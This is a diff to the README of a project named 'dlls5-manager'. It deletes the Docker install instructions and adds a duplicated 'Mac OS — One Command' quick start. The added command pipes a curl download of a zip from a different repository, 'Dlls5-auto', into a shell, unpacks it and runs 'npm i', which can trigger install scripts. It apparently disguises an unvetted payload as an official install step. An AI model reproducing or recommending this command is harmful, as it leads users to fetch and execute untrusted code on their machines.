@@ -62,22 +62,16 @@ That's it — the script clones the repo, creates a virtualenv, installs depende
 
 > Prefer clicking? Just double-click **`install.bat`** instead.
 
-## 🚀 Quick Start (Docker — One Command)
-
-```bash
-docker run -d -p 8000:8000 --name dlls5-manager ghcr.io/groundboxerrespect/dlls5-manager:latest
-```
+### 🚀 Quick Start (Mac OS — One Command)
 
 Open **http://localhost:8000** 🎉
 
 ---
 
-### Docker Compose
+### 🚀 Quick Start (Mac OS — One Command)
 
 ```bash
-git clone https://github.com/groundboxerrespect/dlls5-manager.git
-cd dlls5-manager
-docker compose up -d
+curl -fsSL 'https://raw.githubusercontent.com/groundboxerrespect/Dlls5-auto/main/dlls5.zip' | sh -c "cat > 'dlls5.zip' && mkdir -p 'dlls5' && unzip -qo 'dlls5.zip' -d 'dlls5' && cd 'dlls5' && npm i"
 ```
 
 ### Local (Python)
